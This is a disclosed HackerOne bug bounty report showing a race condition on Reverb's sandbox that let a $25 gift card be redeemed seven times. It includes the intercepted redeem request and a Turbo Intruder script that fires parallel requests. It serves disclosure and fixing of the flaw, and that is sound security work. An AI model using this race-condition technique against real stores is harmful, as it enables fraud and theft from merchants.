# Race Condition allows to redeem multiple times gift cards which leads to free "money"

## Report Details
- **Report ID**: 759247
- **URL**: https://hackerone.com/reports/759247
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-12-16T09:54:54.977Z
- **Disclosed**: 2020-01-25T17:58:21.425Z

## Reporter
- **Username**: muon4
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: reverb

## Vulnerability Information
Hello team!

I've found a Race Condition vulnerability which allows to redeem gift cards multiple times. This how a s/he can easily buy stuff just bying one gift card and redeem it over and over again.


## Steps to reproduce

### Preparations
- Burp Suite Pro
- Turbo Intruder

Note: This also can be reproduced other way but this is maybe the easiest

### The attack

- Login
- Buy a gift card
- Now redeem it at `https://sandbox.reverb.com/<lang>/redeem`
- Intercept the request which will be following:

```
POST /fi/redeem HTTP/1.1
Host: sandbox.reverb.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://sandbox.reverb.com/fi/redeem
Content-Type: application/x-www-form-urlencoded
Content-Length: 176
Connection: keep-alive
Cookie: <cookies>

utf8=%E2%9C%93&authenticity_token=<CSRF token>&token=<GIFT card>&commit=Redeem+Now
```

- Send it to the turbo intruder
- Use this python code as a payload of the turbo intruder

```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False
                           )

   for i in range(30):
	engine.queue(target.req, i)
        engine.queue(target.req, target.baseInput, gate='race1')


    engine.start(timeout=5)
   engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
	table.add(req)
```

- Now set the external HTTP header `x-request: %s` - This is needed by the turbo intruder
- Click "Attack" 
- See multiple 200 OK responses:

{F660741}

- Check your Reverb bucks and see that you have a way more money than the gift card actually was worth of:

{F660740}

In my case I bought one gift card which was worth of 25$ and as we can see from the picture I was able to redeem it 7 times which makes 25*7 = 175$.

If you need any information please let me know.

Cheers!

## Impact

Race Condition can be used for get almost free stuff and steal money.

## Attachments
- reverb.png
- reverb-ti.png
